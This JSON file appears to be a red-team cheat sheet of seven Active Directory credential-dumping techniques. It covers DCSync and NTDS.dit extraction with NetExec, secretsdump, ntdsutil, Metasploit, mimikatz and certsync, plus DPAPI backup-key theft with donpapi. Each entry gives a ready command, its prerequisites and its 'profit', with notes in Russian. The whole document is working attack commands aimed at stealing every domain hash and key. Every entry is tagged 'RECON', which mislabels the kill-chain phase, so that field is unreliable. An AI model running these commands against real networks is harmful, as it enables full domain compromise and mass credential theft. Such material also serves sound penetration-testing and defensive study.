[
  {
    "condition": "Domain admin",
    "attack_type": "Dump ntds.dit (DCSync)",
    "tool": "nxc (NetExec)",
    "req": "Network Admin Access",
    "command": "nxc smb <dcip> -u <user> -p <password> -d <domain> --ntds",
    "profit": "Domain Hashes (NTDS.dit)",
    "critical_note": "Удаленный дамп базы NTDS через SMB с использованием NetExec.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Domain admin",
    "attack_type": "Dump ntds.dit (DCSync)",
    "tool": "secretsdump.py",
    "req": "Network Admin Access",
    "command": "secretsdump.py '<domain>/<user>:<pass>'@<ip>",
    "profit": "Domain Hashes / LSA Secrets",
    "critical_note": "Удаленное извлечение секретов (DCSync) с помощью скрипта Impacket.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Domain admin",
    "attack_type": "Dump ntds.dit (Offline IFM)",
    "tool": "ntdsutil + secretsdump.py",
    "req": "RDP / Local Shell on DC",
    "command": "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q -> secretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract",
    "profit": "Domain Hashes (Offline)",
    "critical_note": "Создание 'Install From Media' (IFM) снапшота базы AD через ntdsutil и последующее офлайн-извлечение хешей.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Domain admin",
    "attack_type": "Dump ntds.dit (Post-Exp)",
    "tool": "Metasploit Framework",
    "req": "Meterpreter Session on DC",
    "command": "msf> windows/gather/credentials/domain_hashdump",
    "profit": "Domain Hashes",
    "critical_note": "Модуль Metasploit для автоматического сбора доменных учетных данных через существующую сессию.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Domain admin",
    "attack_type": "Dump ntds.dit (DCSync)",
    "tool": "mimikatz",
    "req": "Local Admin / Execution",
    "command": "mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator",
    "profit": "Targeted User Hash / Domain Hashes",
    "critical_note": "Использование функции lsadump::dcsync в Mimikatz для симуляции репликации контроллера домена.",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Domain admin",
    "attack_type": "Dump ntds.dit",
    "tool": "certsync",
    "req": "Network Access",
    "command": "certsync -u <user> -p '<password>' -d <domain> -dc-ip <dc_ip> -ns <name_server>",
    "profit": "NTDS Info / Certificates",
    "critical_note": "Инструмент для синхронизации и дампа данных с контроллера домена (NTDS/CA).",
    "kill_chain_phase": "RECON"
  },
  {
    "condition": "Domain admin",
    "attack_type": "Grab backup Keys",
    "tool": "donpapi",
    "req": "Network Access / DA Creds",
    "command": "donpapi collect -H ':<hash>' <domain>/<user>@<ip_range> -t ALL --fetch-pvk",
    "profit": "DPAPI Master Keys / Backup Keys",
    "critical_note": "Массовый сбор DPAPI ключей и ключей восстановления домена (Backup Keys) для расшифровки секретов пользователей.",
    "kill_chain_phase": "RECON"
  }
]